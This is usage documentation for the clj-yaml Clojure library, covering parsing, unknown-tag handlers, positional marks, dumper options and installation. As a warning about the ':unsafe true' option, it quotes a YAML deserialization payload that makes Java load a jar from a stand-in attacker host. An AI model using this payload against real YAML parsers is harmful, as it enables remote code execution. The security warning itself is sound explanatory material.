== Usage

=== Internal vs Public API

When the clj-commons/clj-yaml team adopted clj-yaml it made some assumptions about the clj-yaml public API.
It turns out folks are using more of clj-yaml than we originally expected.

We encourage you to stick to the higher level functions as documented in the `clj-yaml.core` namespace.

If you do find yourself needing to use the lower level functions, please let us know.
Perhaps you are doing so to overcome a limitation in clj-yaml that we could address to everyone's benefit.

Note that babashka only exposes the higher level functions.

=== Parsing

[source,clojure]
----
(require '[clj-yaml.core :as yaml])

(yaml/generate-string
  [{:name "John Smith", :age 33}
   {:name "Mary Smith", :age 27}])
;; => "- {name: John Smith, age: 33}\n- {name: Mary Smith, age: 27}\n"

(yaml/parse-string "
- {name: John Smith, age: 33}
- name: Mary Smith
  age: 27
")
;; => ({:name "John Smith", :age 33}
;      {:name "Mary Smith", :age 27})
----

By default, YAML keys are converted to clojure keywords. To prevent this, add `:keywords false` parameters to the `parse-string` function:

[source,clojure]
----
(yaml/parse-string "
- {name: John Smith}
" :keywords false)
;; => ({"name" "John Smith"})
----

==== Unknown tags [[unknown-tags]]
Unknown tags can be handled by passing a handler function via the
`:unknown-tag-fn` parameter. The handler function is provided a map which
includes `:tag` and `:value` keys. Note that the value passed to the
`unknown-tag-fn` is a string if it's a scalar, regardless of the quoting (or
lack thereof) of the scalar value.

[source,clojure]
----
;; drop unknown tags
(yaml/parse-string "!Base12 10" :unknown-tag-fn :value
;; => "10"

;; or do some smart convertion
(yaml/parse-string "!Base12 10"
                   :unknown-tag-fn (fn [{:keys [tag value]}]
                                      (if (= "!Base12" tag)
                                          (Integer/parseInt value 12)
                                          value)))
;; => 12
----

==== Unsafe YAML [[unsafe]]
Clj-yaml optionally supports the creation of Java classes.
This is considered unsafe.

IMPORTANT: Be very wary of specifying `:unsafe true` unless you completely trust your YAML inputs.
Consider instead using `:unknown-tag-fn` for fine and deliberate control.

An example of some malicious YAML is https://j0vsec.com/post/cve-2021-25738/[well described by J0VSEC].
Here's the dangerous snippit described:

[source, yaml]
----
some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker-server.tld/poc.jar"]]]]
----

Also security related are `:allow-recursive-keys` and `:max-aliases-for-collections` options.

==== Positional Data [[mark]]
You can ask clj-yaml to return parsed YAML with extra positional data markers.

[source,clojure]
----
(def some-yaml )

(yaml/parse-string "
- name: Mary Smith
  age: 27
" :mark true)
;; => {:start {:line 1, :index 1, :column 0},
;;     :end {:line 3, :index 30, :column 0},
;;     :unmark
;;     ({:start {:line 1, :index 3, :column 2},
;;       :end {:line 3, :index 30, :column 0},
;;       :unmark
;;       {{:start {:line 1, :index 3, :column 2},
;;         :end {:line 1, :index 7, :column 6},
;;         :unmark "name"}
;;        {:start {:line 1, :index 9, :column 8},
;;         :end {:line 1, :index 19, :column 18},
;;         :unmark "Mary Smith"},
;;        {:start {:line 2, :index 22, :column 2},
;;         :end {:line 2, :index 25, :column 5},
;;         :unmark "age"}
;;        {:start {:line 2, :index 27, :column 7},
;;         :end {:line 2, :index 29, :column 9},
;;         :unmark 27}}})}
----

In reality, the `:start` `:end` and `:unmark` maps are internally a record and can be recognized via `marked?` and unwrapped via `unmark`.

=== Generating

==== Dumper Options [[dumper-options]]
Different flow styles (`:auto`, `:block`, `:flow`) allow customization of how YAML is rendered.

To demonstrate let's setup `some-data` to play with.

[source,clojure]
----
(def some-yaml "
todo:
  - name: Fix issue
    responsible:
      name: Rita
")

(def some-data (yaml/parse-string some-yaml))
----

To select the `:block` flow style:
[source,clojure]
----
(yaml/generate-string some-data :dumper-options {:flow-style :block})
----

results in a string of YAML, that when printed:
[source,yaml]
----
todo:
- name: Fix issue
  responsible:
    name: Rita
----

The same but with the `:flow` style results in:
[source,yaml]
----
{todo: [{name: Fix issue, responsible: {name: Rita}}]}
----

And finally the `:auto` style (the default) renders:
[source,yaml]
----
todo:
- name: Fix issue
  responsible: {name: Rita}
----

Use the `:indent` (default: `2`) and `:indicator-indent` (default: `0`) options to adjust indentation:

[source,clojure]
----
(yaml/generate-string some-data :dumper-options {:indent 6
                                                 :indicator-indent 3
                                                 :flow-style :block})
----

results in:
[source,yaml]
----
todo:
   -  name: Fix issue
      responsible:
            name: Rita
----

`:indent` must always be larger than `:indicator-indent`.
If only 1 higher, the indicator will be on a separate line:

[source,clojure]
----
(yaml/generate-string some-data :dumper-options {:indent 2
                                                 :indicator-indent 1
                                                 :flow-style :block})
----
outputs:
[source,yaml]
----
todo:
 -
  name: Fix issue
  responsible:
    name: Rita
----

== Installation

`clj-commons/clj-yaml` is available as a Maven artifact from http://clojars.org/clj-commons/clj-yaml[Clojars].

=== Leiningen/Boot

[source,clojure,subs="attributes+"]
----
[clj-commons/clj-yaml "{lib-version}"]
----

=== Clojure CLI/`deps.edn`

[source,clojure,subs="attributes+"]

----

=== Use as git dependency

To get the latest changes that are not yet released to Clojars, you can use this library as a git dependency:

[source,clojure]
----
$ cat deps.edn
{:deps {clj-commons/clj-yaml {:git/url "https://github.com/clj-commons/clj-yaml"
                              :git/sha "05eaca35c34c092ffdd2e620ef07962ce147a88b"}}}

$ clj -X:deps prep
$ clj -M -e "(require '[clj-yaml.core :as yaml])"
----

Replace the `:git/sha` value as appropriate.
